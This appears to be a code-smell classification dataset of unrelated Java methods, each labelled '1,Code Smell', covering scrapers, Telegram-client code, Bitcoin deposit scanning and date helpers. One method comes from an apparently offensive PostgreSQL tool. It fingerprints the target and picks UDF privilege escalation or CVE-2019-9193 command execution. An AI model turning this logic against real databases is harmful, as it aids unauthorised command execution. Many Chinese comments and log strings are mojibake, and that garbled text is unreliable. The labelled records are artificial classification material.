      buf.append("" FROM (VALUES (1))"");
    }
    buf.append("")"");
  }
  return buf.toString();
}",1,Code Smell
"/** 
 * 鑾峰彇鍒嗙被鏁版嵁 + 棣栭〉鏈�杩戞洿鏂拌棰戝垪琛ㄦ暟鎹�
 * @param filter 鏄惁寮�鍚瓫閫� 鍏宠仈鐨勬槸 杞欢璁剧疆涓� 棣栭〉鏁版嵁婧愰噷鐨勭瓫閫夊紑鍏�
 * @return
 */
@Override public String homeContent(boolean filter){
  try {
    String url=siteUrl + '/';
    Document doc=Jsoup.parse(OkHttpUtil.string(url,getHeaders(url)));
    Elements elements=doc.select(""ul.nav-menu>li>a"");
    JSONArray classes=new JSONArray();
    ArrayList<String> allClass=new ArrayList<>();
    for (    Element ele : elements) {
      String name=ele.text();
      boolean show=!filter || (name.equals(""闆诲奖"") || name.equals(""鍔囬泦"") || name.equals(""缍滆棟"")|| name.equals(""鍕曟极""));
      if (allClass.contains(name))       show=false;
      if (show) {
        allClass.add(name);
        Matcher mather=regexCategory.matcher(ele.attr(""href""));
        if (!mather.find())         continue;
        String id=mather.group(1).trim();
        JSONObject jsonObject=new JSONObject();
        jsonObject.put(""type_id"",id);
        jsonObject.put(""type_name"",name);
        classes.put(jsonObject);
      }
    }
    JSONObject result=new JSONObject();
    if (filter) {
      result.put(""filters"",filterConfig);
    }
    result.put(""class"",classes);
    try {
      Elements list=doc.select(""div.col-lg-wide-75 > ul.myui-vodlist li div.myui-vodlist__box"");
      JSONArray videos=new JSONArray();
      for (int i=0; i < list.size(); i++) {
        Element vod=list.get(i);
        String title=vod.selectFirst("".title"").text();
        String cover=vod.selectFirst("".myui-vodlist__thumb"").attr(""data-original"");
        String remark=vod.selectFirst(""span.pic-text"").text();
        Matcher matcher=regexVid.matcher(vod.selectFirst("".myui-vodlist__thumb"").attr(""href""));
        if (!matcher.find())         continue;
        String id=matcher.group(1);
        JSONObject v=new JSONObject();
        v.put(""vod_id"",id);
        v.put(""vod_name"",title);
        v.put(""vod_pic"",cover);
        v.put(""vod_remarks"",remark);
        videos.put(v);
      }
      result.put(""list"",videos);
    }
 catch (    Exception e) {
      SpiderDebug.log(e);
    }
    return result.toString();
  }
 catch (  Exception e) {
    SpiderDebug.log(e);
  }
  return """";
}",1,Code Smell
"public void loadStatus(boolean force){
  if (loadingStatus || loadedStatus && !force)   return;
  loadingStatus=true;
  ConnectionsManager.getInstance(currentAccount).sendRequest(new TL_smsjobs.TL_smsjobs_getStatus(),(res,err) -> AndroidUtilities.runOnUIThread(() -> {
    TL_smsjobs.TL_smsjobs_status lastStatus=currentStatus;
    TL_smsjobs.TL_smsjobs_eligibleToJoin lastIsEligible=isEligible;
    int lastState=currentState, state=currentState;
    loadingStatus=false;
    loadedStatus=true;
    if (res instanceof TL_smsjobs.TL_smsjobs_status) {
      state=STATE_JOINED;
      currentStatus=(TL_smsjobs.TL_smsjobs_status)res;
      saveCacheStatus();
    }
 else     if (err != null && ""NOT_JOINED"".equals(err.text)) {
      if (state == STATE_JOINED) {
        state=STATE_NONE;
      }
      currentStatus=null;
      saveCacheStatus();
    }
 else     if (err != null && ""NOT_ELIGIBLE"".equals(err.text)) {
      if (state == STATE_JOINED) {
        state=STATE_NONE;
      }
      currentStatus=null;
      isEligible=null;
      saveCacheStatus();
    }
 else {
      BulletinFactory.showError(err);
    }
    if (lastStatus != currentStatus || lastIsEligible != isEligible || lastState != state) {
      setState(state);
      NotificationCenter.getInstance(currentAccount).postNotificationName(NotificationCenter.mainUserInfoChanged);
      NotificationCenter.getInstance(currentAccount).postNotificationName(NotificationCenter.smsJobStatusUpdate);
      SMSJobsNotification.check();
    }
  }
));
}
",1,Code Smell
"@Override public List<Deposit> replayBlock(Long startBlockNumber,Long endBlockNumber){
  List<Deposit> deposits=new ArrayList<Deposit>();
  try {
    for (Long blockHeight=startBlockNumber; blockHeight <= endBlockNumber; blockHeight++) {
      String blockHash=rpcClient.getBlockHash(blockHeight.intValue());
      Bitcoin.Block block=rpcClient.getBlock(blockHash);
      List<String> txids=block.tx();
      logger.info(""鑾峰彇鍖哄潡("" + blockHeight + "")浜ゆ槗鍒楄〃锛屾讳氦鏄撴暟锛""+ txids.size()+ """");
      for (      String txid : txids) {
        Bitcoin.RawTransaction transaction=rpcClient.getRawTransaction(txid);
        List<Bitcoin.RawTransaction.Out> outs=transaction.vOut();
        if (outs != null) {
          for (          Bitcoin.RawTransaction.Out out : outs) {
            if (out.scriptPubKey() != null) {
              List<String> addresses=out.scriptPubKey().addresses();
              if (addresses != null && addresses.size() > 0) {
                String address=out.scriptPubKey().addresses().get(0);
                BigDecimal amount=new BigDecimal(out.value());
                if (accountService.isAddressExist(address)) {
                  logger.info(""鍙戠幇鍏呭煎湴鍧("" + address + "")锛屽厖鍊奸噾棰濓細""+ amount+ "" BTC"");
                  Deposit deposit=new Deposit();
                  deposit.setTxid(transaction.txId());
                  deposit.setBlockHeight((long)block.height());
                  deposit.setBlockHash(transaction.blockHash());
                  deposit.setAmount(amount);
                  deposit.setAddress(address);
                  deposit.setTime(transaction.time());
                  deposits.add(deposit);
                }
              }
            }
          }
        }
      }
    }
  }
 catch (  Exception e) {
    e.printStackTrace();
    return null;
  }
  return deposits;
}",1,Code Smell
"private String calcLastTime(String cTime,String type,String dateStyle,String datePattern){
  try {
    String lastTime=null;
    Calendar calendar=Calendar.getInstance();
    if (StringUtils.equalsIgnoreCase(type,ChartConstants.YEAR_MOM)) {
      SimpleDateFormat simpleDateFormat=new SimpleDateFormat(""yyyy"");
      Date date=simpleDateFormat.parse(cTime);
      calendar.setTime(date);
      calendar.add(Calendar.YEAR,-1);
      lastTime=simpleDateFormat.format(calendar.getTime());
    }
 else     if (StringUtils.equalsIgnoreCase(type,ChartConstants.MONTH_MOM)) {
      SimpleDateFormat simpleDateFormat=null;
      if (StringUtils.equalsIgnoreCase(datePattern,""date_split"")) {
        simpleDateFormat=new SimpleDateFormat(""yyyy/MM"");
      }
 else {
        simpleDateFormat=new SimpleDateFormat(""yyyy-MM"");
      }
      Date date=simpleDateFormat.parse(cTime);
      calendar.setTime(date);
      calendar.add(Calendar.MONTH,-1);
      lastTime=simpleDateFormat.format(calendar.getTime());
    }
 else     if (StringUtils.equalsIgnoreCase(type,ChartConstants.YEAR_YOY)) {
      SimpleDateFormat simpleDateFormat=null;
      if (StringUtils.equalsIgnoreCase(dateStyle,""y_M"")) {
        if (StringUtils.equalsIgnoreCase(datePattern,""date_split"")) {
          simpleDateFormat=new SimpleDateFormat(""yyyy/MM"");
        }
 else {
          simpleDateFormat=new SimpleDateFormat(""yyyy-MM"");
        }
      }
 else       if (StringUtils.equalsIgnoreCase(dateStyle,""y_M_d"")) {
        if (StringUtils.equalsIgnoreCase(datePattern,""date_split"")) {
          simpleDateFormat=new SimpleDateFormat(""yyyy/MM/dd"");
        }
 else {
          simpleDateFormat=new SimpleDateFormat(""yyyy-MM-dd"");
        }
      }
      Date date=simpleDateFormat.parse(cTime);
      calendar.setTime(date);
      calendar.add(Calendar.YEAR,-1);
      lastTime=simpleDateFormat.format(calendar.getTime());
    }
 else     if (StringUtils.equalsIgnoreCase(type,ChartConstants.DAY_MOM)) {
      SimpleDateFormat simpleDateFormat=null;
      if (StringUtils.equalsIgnoreCase(datePattern,""date_split"")) {
        simpleDateFormat=new SimpleDateFormat(""yyyy/MM/dd"");
      }
 else {
        simpleDateFormat=new SimpleDateFormat(""yyyy-MM-dd"");
      }
      Date date=simpleDateFormat.parse(cTime);
      calendar.setTime(date);
      calendar.add(Calendar.DAY_OF_MONTH,-1);
      lastTime=simpleDateFormat.format(calendar.getTime());
    }
 else     if (StringUtils.equalsIgnoreCase(type,ChartConstants.MONTH_YOY)) {
      SimpleDateFormat simpleDateFormat=null;
      if (StringUtils.equalsIgnoreCase(dateStyle,""y_M"")) {
        if (StringUtils.equalsIgnoreCase(datePattern,""date_split"")) {
          simpleDateFormat=new SimpleDateFormat(""yyyy/MM"");
        }
 else {
          simpleDateFormat=new SimpleDateFormat(""yyyy-MM"");
        }
      }
 else       if (StringUtils.equalsIgnoreCase(dateStyle,""y_M_d"")) {
        if (StringUtils.equalsIgnoreCase(datePattern,""date_split"")) {
          simpleDateFormat=new SimpleDateFormat(""yyyy/MM/dd"");
        }
 else {
          simpleDateFormat=new SimpleDateFormat(""yyyy-MM-dd"");
        }
      }
      Date date=simpleDateFormat.parse(cTime);
      calendar.setTime(date);
      calendar.add(Calendar.MONTH,-1);
      lastTime=simpleDateFormat.format(calendar.getTime());
    }
    return lastTime;
  }
 catch (  Exception e) {
    return cTime;
  }
}",1,Code Smell
"public JSONObject handleSteps(StepsDTO steps){
  JSONObject stepsJsonObj=(JSONObject)JSONObject.toJSON(steps);
  if (steps == null) {
    return stepsJsonObj;
  }
  if (steps.getDisabled() == 1) {
    return stepsJsonObj;
  }
  if (steps.getStepType().equals(""publicStep"")) {
    PublicStepsDTO publicStepsDTO=publicStepsService.findById(Integer.parseInt(steps.getText()),true);
    if (publicStepsDTO != null) {
      JSONArray publicStepsJson=new JSONArray();
      for (      StepsDTO pubStep : publicStepsDTO.getSteps()) {
        if (pubStep.getDisabled() == 1) {
          continue;
        }
        publicStepsJson.add(getStep(pubStep));
      }
      stepsJsonObj.put(""pubSteps"",publicStepsJson);
    }
  }
 else   if (steps.getStepType().equals(""install"") && steps.getContent().equals(""2"")) {
    String plat=""unknown"";
    if (steps.getPlatform() == PlatformType.ANDROID) {
      plat=""Android"";
    }
    if (steps.getPlatform() == PlatformType.IOS) {
      plat=""iOS"";
    }
    stepsJsonObj.put(""text"",packagesService.findOne(steps.getProjectId(),steps.getText(),plat));
  }
  if (CollectionUtils.isEmpty(steps.getChildSteps())) {
    return stepsJsonObj;
  }
  JSONArray childStepJsonObjs=new JSONArray();
  List<StepsDTO> childSteps=steps.getChildSteps();
  for (  StepsDTO childStep : childSteps) {
    if (childStep.getDisabled() == 1) {
      continue;
    }
    JSONObject childStepJsonObj=handleSteps(childStep);
    childStepJsonObjs.add(childStepJsonObj);
  }
  stepsJsonObj.put(""childSteps"",childStepJsonObjs);
  return stepsJsonObj;
}",1,Code Smell
"private static void instrument(TransformationContext context,MethodNode methodNode,ClassVisitor classVisitor){
  String originalDescriptor=methodNode.desc;
  String[] exceptionsArray=methodNode.exceptions.toArray(new String[0]);
  List<OutputArgument> writableArguments=getWritableArguments(methodNode);
  OutputArgument writableReturn=getWritableReturnValue(methodNode);
  OutputArgument enterArgument=getEnterArgument(methodNode);
  List<AdviceLocal> adviceLocals=getLocals(methodNode);
  boolean isEnterAdvice=isEnterAdvice(methodNode);
  boolean isExitAdvice=isExitAdvice(methodNode);
  Type returnType=Type.getReturnType(methodNode.desc);
  if (isEnterAdvice && !(returnType.getSort() == Type.VOID || returnType.getSort() == Type.OBJECT || returnType.getSort() == Type.ARRAY)) {
    context.disableReturnTypeChange();
  }
  if (!context.canChangeReturnType()) {
    enterArgument=null;
  }
  if (context.canChangeReturnType() || (isExitAdvice && Type.VOID_TYPE.equals(returnType))) {
    if (!writableArguments.isEmpty() || writableReturn != null || !Type.VOID_TYPE.equals(returnType) || (!adviceLocals.isEmpty() && isEnterAdvice)) {
      Type[] argumentTypes=Type.getArgumentTypes(methodNode.desc);
      if (!adviceLocals.isEmpty() && isEnterAdvice) {
        for (        AdviceLocal adviceLocal : adviceLocals) {
          argumentTypes[adviceLocal.adviceIndex]=OBJECT_TYPE;
        }
      }
      methodNode.desc=Type.getMethodDescriptor(OBJECT_ARRAY_TYPE,argumentTypes);
      MethodNode tmp=new MethodNode(methodNode.access,methodNode.name,methodNode.desc,methodNode.signature,exceptionsArray);
      MethodVisitor mv=instrumentOurParameters(context,tmp,methodNode,originalDescriptor,writableArguments,writableReturn,adviceLocals);
      methodNode.accept(mv);
      methodNode=tmp;
      adviceLocals=getLocals(methodNode);
    }
    if ((!adviceLocals.isEmpty() || enterArgument != null) && isExitAdvice) {
      Type[] newArgumentTypes=Type.getArgumentTypes(methodNode.desc);
      for (      AdviceLocal adviceLocal : adviceLocals) {
        newArgumentTypes[adviceLocal.adviceIndex]=OBJECT_TYPE;
      }
      if (enterArgument != null) {
        newArgumentTypes[enterArgument.adviceIndex]=OBJECT_TYPE;
      }
      List<Type> typeList=new ArrayList<>(Arrays.asList(newArgumentTypes));
      typeList.add(OBJECT_ARRAY_TYPE);
      methodNode.desc=Type.getMethodDescriptor(Type.getReturnType(methodNode.desc),typeList.toArray(new Type[0]));
      MethodNode tmp=new MethodNode(methodNode.access,methodNode.name,methodNode.desc,methodNode.signature,exceptionsArray);
      MethodVisitor mv=instrumentAdviceLocals(false,tmp,methodNode,originalDescriptor,adviceLocals,enterArgument,-1);
      methodNode.accept(mv);
      methodNode=tmp;
    }
  }
  applyAdviceDelegation(context,methodNode,classVisitor,exceptionsArray);
}",1,Code Smell
"/** 
 * Processes a single LogMinerEventRow.
 * @param row the event row, must not be {@code null}
 * @throws SQLException if a database exception occurred
 * @throws InterruptedException if the dispatcher was interrupted sending an event
 */
protected void processRow(OraclePartition partition,LogMinerEventRow row) throws SQLException, InterruptedException {
  if (!row.getEventType().equals(EventType.MISSING_SCN)) {
    lastProcessedScn=row.getScn();
  }
  if (row.getScn().compareTo(offsetContext.getSnapshotScn()) < 0) {
    Map<String,Scn> snapshotPendingTransactions=offsetContext.getSnapshotPendingTransactions();
    if (snapshotPendingTransactions == null || !snapshotPendingTransactions.containsKey(row.getTransactionId())) {
      LOGGER.debug(""Skipping event {} (SCN {}) because it is already encompassed by the initial snapshot"",row.getEventType(),row.getScn());
      return;
    }
  }
switch (row.getEventType()) {
case MISSING_SCN:
    handleMissingScn(row);
case START:
  handleStart(row);
break;
case COMMIT:
handleCommit(partition,row);
break;
case ROLLBACK:
handleRollback(row);
break;
case DDL:
handleSchemaChange(row);
break;
case SELECT_LOB_LOCATOR:
handleSelectLobLocator(row);
break;
case LOB_WRITE:
handleLobWrite(row);
break;
case LOB_ERASE:
handleLobErase(row);
break;
case INSERT:
case UPDATE:
case DELETE:
handleDataEvent(row);
break;
case UNSUPPORTED:
handleUnsupportedEvent(row);
break;
}
}",1,Code Smell
"public static void loadProxyList(){
  if (proxyListLoaded) {
    return;
  }
  if (!proxyList.isEmpty()) {
    for (    ProxyInfo proxyInfo : getProxyList()) {
      if (proxyInfo instanceof ExternalSocks5Proxy) {
        ((ExternalSocks5Proxy)proxyInfo).stop();
      }
    }
  }
  proxyListLoaded=true;
  proxyList.clear();
  currentProxy=null;
  int current=MessagesController.getGlobalMainSettings().getInt(""current_proxy"",0);
  for (  SubInfo subInfo : SubManager.getSubList().find()) {
    if (!subInfo.enable)     continue;
    for (    String proxy : subInfo.proxies) {
      try {
        ProxyInfo info=parseProxyInfo(proxy);
        info.subId=subInfo.id;
        if (info.hashCode() == current) {
          currentProxy=info;
          if (info instanceof ExternalSocks5Proxy) {
            UIUtil.runOnIoDispatcher(() -> {
              try {
                ((ExternalSocks5Proxy)info).start();
              }
 catch (              Exception e) {
                FileLog.e(e);
                AlertUtil.showToast(e);
              }
            }
);
          }
        }
        proxyList.add(info);
      }
 catch (      Exception e) {
        FileLog.d(""load sub proxy failed: "" + e);
      }
    }
  }
  File proxyListFile=new File(ApplicationLoader.applicationContext.getFilesDir().getParentFile(),""nekox/proxy_list.json"");
  boolean error=false;
  if (proxyListFile.isFile()) {
    try {
      JSONArray proxyArray=new JSONArray(FileUtil.readUtf8String(proxyListFile));
      for (int a=0; a < proxyArray.length(); a++) {
        JSONObject proxyObj=proxyArray.getJSONObject(a);
        ProxyInfo info;
        try {
          info=ProxyInfo.fromJson(proxyObj);
        }
 catch (        Exception ex) {
          FileLog.d(""load proxy failed: "" + ex);
          error=true;
          continue;
        }
        proxyList.add(info);
        if (info.hashCode() == current) {
          currentProxy=info;
          if (info instanceof ExternalSocks5Proxy) {
            UIUtil.runOnIoDispatcher(() -> {
              try {
                ((ExternalSocks5Proxy)info).start();
              }
 catch (              Exception e) {
                FileLog.e(e);
                AlertUtil.showToast(e);
              }
            }
);
          }
        }
      }
    }
 catch (    Exception ex) {
      FileLog.d(""invalid proxy list json format"" + ex);
    }
  }
  if (error)   saveProxyList();
  SharedPreferences preferences=ApplicationLoader.applicationContext.getSharedPreferences(""mainconfig"",Activity.MODE_PRIVATE);
  boolean proxyEnabledValue=preferences.getBoolean(""proxy_enabled"",false);
  if (proxyEnabledValue && currentProxy == null)   proxyEnabledValue=false;
  proxyEnabled=proxyEnabledValue;
}",1,Code Smell
"public void getInfo(){
  List<String> wVersion=Arrays.asList(""w64"",""w32"",""mingw"",""visual studio"",""Visual C++"");
  String sql=PostgreSqlUtil.versionInfoSql;
  String specificVersionSql=PostgreSqlUtil.serverVersionInfoSql;
  sql=Base64XOR.base64Encode(sql.getBytes(StandardCharsets.UTF_8),""UTF-8"");
  specificVersionSql=Base64XOR.base64Encode(specificVersionSql.getBytes(StandardCharsets.UTF_8),""UTF-8"");
  try {
    String version=executeSQLStatement(this.dataObj,sql,""UTF-8"");
    for (    String str : wVersion) {
      if (version.contains(str)) {
        systemplatform=""windows"";
        systemTempPath=""c:\\users\\public\\"";
        break;
      }
    }
    if ("""".equals(systemplatform)) {
      systemplatform=""linux"";
      systemTempPath=""/tmp/"";
    }
    if (version.contains(""32-bit"")) {
      systemVersionNum=""32"";
    }
 else {
      systemVersionNum=""64"";
    }
    postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log(String.format(""棰勫垽鏈嶅姟鍣ㄧ被鍨嬶細%s 鏈嶅姟鍣ㄧ増鏈�: %s"",systemplatform,systemVersionNum)));
    postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log(String.format(""PostgreSql 鐗堟湰锛�%s"",version)));
    String specificVersion=executeSQLStatement(this.dataObj,specificVersionSql,""UTF-8"");
    String versionStr;
    if (specificVersion.indexOf("" "") > 0) {
      versionStr=specificVersion.substring(0,specificVersion.indexOf("" "") + 1);
    }
 else {
      versionStr=specificVersion;
    }
    String[] versionSplit=versionStr.split(""\\."");
    versionNumber=Double.parseDouble(String.join(""."",versionSplit[0],versionSplit[1]));
    if (versionNumber <= 8.2) {
      evalType=""low"";
      postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log(""鐗堟湰灏忎簬 8.2 鍙洿鎺ュ垱寤� system 鍑芥暟""));
    }
 else     if (versionNumber > 8.2 && versionNumber < 9.3) {
      evalType=""udf"";
      String path=Utils.getSelfPath() + File.separator + ""Plugins""+ File.separator+ ""PostgreSql""+ File.separator+ versionNumber.toString()+ ""_""+ systemplatform+ ""_""+ systemVersionNum+ ""_hex.txt"";
      pluginFile=Utils.readFile(path).replace(""\n"","""");
      postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log(""鐗堟湰鍙互灏濊瘯杩涜 UDF 鎻愭潈""));
    }
 else     if (versionNumber >= 9.3) {
      evalType=""cve"";
      postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log(""9.3 浠ヤ笂鐗堟湰榛樿浣跨敤 CVE-2019-9193""));
    }
 else {
      postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log(""璇ョ増鏈皻鏈紪璇慤DF鎴栨棤娉曟彁鏉�""));
    }
  }
 catch (  Exception ex) {
    String error=ex.getMessage();
    MessageUtil.showExceptionMessage(ex,error);
  }
}",1,Code Smell
"/** 
 * Accumulate a error count for the remote address
 * @param remoteAddr    the remote address
 */
public void addRmtAddrErrCount(String remoteAddr){
  RemoteConErrStats rmtConErrStats=remoteAddrMap.get(remoteAddr);
  if (rmtConErrStats == null) {
    RemoteConErrStats newErrStatistic=new RemoteConErrStats(linkStatsDurationMs,linkStatsMaxAllowedFailCount);
    rmtConErrStats=remoteAddrMap.putIfAbsent(remoteAddr,newErrStatistic);
    if (rmtConErrStats == null) {
      rmtConErrStats=newErrStatistic;
    }
  }
  if (rmtConErrStats.increErrCount()) {
    boolean isAdded=false;
    Long beforeTime=forbiddenAddrMap.get(remoteAddr);
    if (beforeTime == null) {
      int totalCount=0;
      Long curTime=System.currentTimeMillis();
      Set<String> expiredAddrs=new HashSet<>();
      for (      Map.Entry<String,Long> entry : forbiddenAddrMap.entrySet()) {
        if (entry.getKey() == null || entry.getValue() == null) {
          continue;
        }
        if ((curTime - entry.getValue()) > linkStatsForbiddenDurMs) {
          expiredAddrs.add(entry.getKey());
          continue;
        }
        totalCount++;
      }
      if (!expiredAddrs.isEmpty()) {
        for (        String tmpAddr : expiredAddrs) {
          Long sotreTime=forbiddenAddrMap.get(tmpAddr);
          if (sotreTime == null) {
            continue;
          }
          if ((curTime - sotreTime) > linkStatsForbiddenDurMs) {
            forbiddenAddrMap.remove(tmpAddr);
          }
        }
      }
      int needForbiddenCount=(int)Math.rint(remoteAddrMap.size() * linkStatsMaxAllowedForbiddenRate);
      needForbiddenCount=Math.min(needForbiddenCount,30);
      if (needForbiddenCount > totalCount) {
        forbiddenAddrMap.put(remoteAddr,System.currentTimeMillis());
        isAdded=true;
      }
    }
 else {
      forbiddenAddrMap.put(remoteAddr,System.currentTimeMillis());
      isAdded=true;
    }
    long curLastPrintTime=lastLogPrintTime.get();
    if ((isAdded) && (System.currentTimeMillis() - curLastPrintTime > 120000)) {
      if (lastLogPrintTime.compareAndSet(curLastPrintTime,System.currentTimeMillis())) {
        logger.info(new StringBuilder(512).append(""[Remote Address] forbidden list : "").append(forbiddenAddrMap.toString()).toString());
      }
    }
  }
}",1,Code Smell
"public static CharSequence replaceWithRestrictedEmoji(CharSequence cs,TextView textView,Runnable update){
  return replaceWithRestrictedEmoji(cs,textView.getPaint().getFontMetricsInt(),update);
}
public static CharSequence replaceWithRestrictedEmoji(CharSequence cs,Paint.FontMetricsInt fontMetrics,Runnable update){
  if (NekoConfig.useSystemEmoji.Bool() || cs == null || cs.length() == 0) {
    return cs;
  }
  final int currentAccount=UserConfig.selectedAccount;
  TLRPC.InputStickerSet inputStickerSet=new TLRPC.TL_inputStickerSetShortName();
  inputStickerSet.short_name=""RestrictedEmoji"";
  TLRPC.TL_messages_stickerSet set=MediaDataController.getInstance(currentAccount).getStickerSet(inputStickerSet,0,false,true,update == null ? null : s -> update.run());
  Spannable s;
  if (cs instanceof Spannable) {
    s=(Spannable)cs;
  }
 else {
    s=Spannable.Factory.getInstance().newSpannable(cs.toString());
  }
  ArrayList<EmojiSpanRange> emojis=parseEmojis(s,null);
  if (emojis.isEmpty()) {
    return cs;
  }
  AnimatedEmojiSpan[] animatedEmojiSpans=s.getSpans(0,s.length(),AnimatedEmojiSpan.class);
  EmojiSpan span;
  Drawable drawable;
  int limitCount=SharedConfig.getDevicePerformanceClass() >= SharedConfig.PERFORMANCE_CLASS_HIGH ? 100 : 50;
  for (int i=0; i < emojis.size(); ++i) {
    try {
      EmojiSpanRange emojiRange=emojis.get(i);
      if (animatedEmojiSpans != null) {
        boolean hasAnimated=false;
        for (int j=0; j < animatedEmojiSpans.length; ++j) {
          AnimatedEmojiSpan animatedSpan=animatedEmojiSpans[j];
          if (animatedSpan != null && s.getSpanStart(animatedSpan) == emojiRange.start && s.getSpanEnd(animatedSpan) == emojiRange.end) {
            hasAnimated=true;
            break;
          }
        }
        if (hasAnimated) {
          continue;
        }
      }
      TLRPC.Document document=null;
      if (set != null) {
        for (        TLRPC.Document d : set.documents) {
          if (MessageObject.findAnimatedEmojiEmoticon(d,null).contains(emojiRange.code)) {
            document=d;
            break;
          }
        }
      }
      AnimatedEmojiSpan animatedSpan;
      if (document != null) {
        animatedSpan=new AnimatedEmojiSpan(document,fontMetrics);
      }
 else {
        animatedSpan=new AnimatedEmojiSpan(0,fontMetrics);
      }
      animatedSpan.emoji=(emojiRange.code).toString();
      animatedSpan.cacheType=AnimatedEmojiDrawable.CACHE_TYPE_STANDARD_EMOJI;
      s.setSpan(animatedSpan,emojiRange.start,emojiRange.end,Spanned.SPAN_EXCLUSIVE_EXCLUSIVE);
    }
 catch (    Exception e) {
      FileLog.e(e);
    }
    if ((Build.VERSION.SDK_INT < 23 || Build.VERSION.SDK_INT >= 29) && (i + 1) >= limitCount) {
      break;
    }
  }
  return s;
}",1,Code Smell
"/** 
 * Resolves the specified period uid to a corresponding window sequence number. Either by reusing the window sequence number of an existing matching media period or by creating a new window sequence number.
 * @param periodUid The uid of the timeline period.
 * @return A window sequence number for a media period created for this timeline period.
 */
private long resolvePeriodIndexToWindowSequenceNumber(Object periodUid){
  int windowIndex=timeline.getPeriodByUid(periodUid,period).windowIndex;
  if (oldFrontPeriodUid != null) {
    int oldFrontPeriodIndex=timeline.getIndexOfPeriod(oldFrontPeriodUid);
    if (oldFrontPeriodIndex != C.INDEX_UNSET) {
      int oldFrontWindowIndex=timeline.getPeriod(oldFrontPeriodIndex,period).windowIndex;
      if (oldFrontWindowIndex == windowIndex) {
        return oldFrontPeriodWindowSequenceNumber;
      }
    }
  }
  MediaPeriodHolder mediaPeriodHolder=getFrontPeriod();
  while (mediaPeriodHolder != null) {
    if (mediaPeriodHolder.uid.equals(periodUid)) {
      return mediaPeriodHolder.info.id.windowSequenceNumber;
    }
    mediaPeriodHolder=mediaPeriodHolder.getNext();
  }
  mediaPeriodHolder=getFrontPeriod();
  while (mediaPeriodHolder != null) {
    int indexOfHolderInTimeline=timeline.getIndexOfPeriod(mediaPeriodHolder.uid);
    if (indexOfHolderInTimeline != C.INDEX_UNSET) {
      int holderWindowIndex=timeline.getPeriod(indexOfHolderInTimeline,period).windowIndex;
      if (holderWindowIndex == windowIndex) {
        return mediaPeriodHolder.info.id.windowSequenceNumber;
      }
    }
    mediaPeriodHolder=mediaPeriodHolder.getNext();
  }
  return nextWindowSequenceNumber++;
}
",1,Code Smell
"private void processReplyBeanList(Map<MessageRepliesBean.ReplyBean,TUIMessageBean> replyBeanDataMap){
  Set<String> userIDSet=new HashSet<>();
  for (  Map.Entry<MessageRepliesBean.ReplyBean,TUIMessageBean> entry : replyBeanDataMap.entrySet()) {
    if (entry.getValue() == null) {
      userIDSet.add(entry.getKey().getMessageSender());
    }
  }
  if (userIDSet.isEmpty()) {
    if (replyHandler != null) {
      replyHandler.onRepliesMessageFound(replyBeanDataMap);
    }
    return;
  }
  chatPresenter.getUserBean(userIDSet,new IUIKitCallback<Map<String,UserBean>>(){
    @Override public void onSuccess(    Map<String,UserBean> data){
      for (      Map.Entry<String,UserBean> dataEntry : data.entrySet()) {
        if (dataEntry.getValue() != null) {
          String userID=dataEntry.getKey();
          UserBean userBean=dataEntry.getValue();
          for (          Map.Entry<MessageRepliesBean.ReplyBean,TUIMessageBean> entry : replyBeanDataMap.entrySet()) {
            if (TextUtils.equals(entry.getKey().getMessageSender(),userID)) {
              entry.getKey().setSenderShowName(userBean.getDisplayName());
              entry.getKey().setSenderFaceUrl(userBean.getFaceUrl());
            }
          }
        }
      }
      if (replyHandler != null) {
        replyHandler.onRepliesMessageFound(replyBeanDataMap);
      }
    }
    @Override public void onError(    String module,    int errCode,    String errMsg){
      if (replyHandler != null) {
        replyHandler.onRepliesMessageFound(replyBeanDataMap);
      }
    }
  }
);
}
",1,Code Smell
"public void applyTagRule(ClassReference clsRef,MethodReference methodRef){
  String classname=clsRef.getName();
  for (  TagRule tagRule : tagRules) {
    boolean flag=false;
    if (tagRule.isInWhitelist(classname)) {
      break;
    }
    if (tagRule.isAnnotationType()) {
      Set<String> annotations=methodRef.getAnnotations().keySet();
      for (      String annotation : annotations) {
        flag=check(annotation,tagRule.getAnnotations());
        if (flag) {
          break;
        }
      }
      if (!flag)       continue;
    }
    if (tagRule.isClassType()) {
      flag=check(classname,tagRule.getClasses());
      if (!flag) {
        Set<String> relatedClassnames=SemanticUtils.getAllFatherNodes(classname);
        for (        String related : relatedClassnames) {
          flag=check(related,tagRule.getClasses());
          if (flag)           break;
        }
      }
      if (!flag)       continue;
    }
    if (tagRule.isMethodType()) {
      flag=check(methodRef.getName(),tagRule.getMethods());
      if (!flag)       continue;
    }
    if (flag) {
      methodRef.setType(tagRule.getValue());
      if (methodRef.isEndpoint()) {
        Set<String> baseUrlPaths=SemanticUtils.getHttpUrlPaths(clsRef.getAnnotations());
        String urlPath=SemanticUtils.getHttpUrlPathWithBaseURLPaths(methodRef.getAnnotations(),baseUrlPaths);
        methodRef.setUrlPath(urlPath);
      }
    }
  }
}
",1,Code Smell
"@Override public void progressChanged(EmojiHelper.EmojiPackInfo pack,boolean finished,float progress,long bytesLoaded){
  if (listView == null || listAdapter == null) {
    return;
  }
  EmojiSetCell cell=null;
  for (int i=0; i < listView.getChildCount(); i++) {
    View view=listView.getChildAt(i);
    if (view instanceof EmojiSetCell) {
      if (((EmojiSetCell)view).getPack().getPackId().equals(pack.getPackId())) {
        cell=(EmojiSetCell)view;
        break;
      }
    }
  }
  if (cell == null) {
    return;
  }
  if (!finished) {
    if (progress == 100f) {
      cell.checkDownloaded(true);
    }
 else {
      cell.setProgress(progress,bytesLoaded,true);
    }
  }
 else {
    listAdapter.notifyEmojiSetsChanged();
    listAdapter.notifyItemChanged(useSystemEmojiRow,PARTIAL);
    cell.checkDownloaded(true);
  }
}",1,Code Smell
"private void showRemoveAlert(int position,CharSequence name,Object object,boolean include){
  AlertDialog.Builder builder=new AlertDialog.Builder(getParentActivity());
  if (include) {
    builder.setTitle(LocaleController.getString(""FilterRemoveInclusionTitle"",R.string.FilterRemoveInclusionTitle));
    if (object instanceof String) {
      builder.setMessage(LocaleController.formatString(""FilterRemoveInclusionText"",R.string.FilterRemoveInclusionText,name));
    }
 else     if (object instanceof TLRPC.User) {
      builder.setMessage(LocaleController.formatString(""FilterRemoveInclusionUserText"",R.string.FilterRemoveInclusionUserText,name));
    }
 else {
      builder.setMessage(LocaleController.formatString(""FilterRemoveInclusionChatText"",R.string.FilterRemoveInclusionChatText,name));
    }
  }
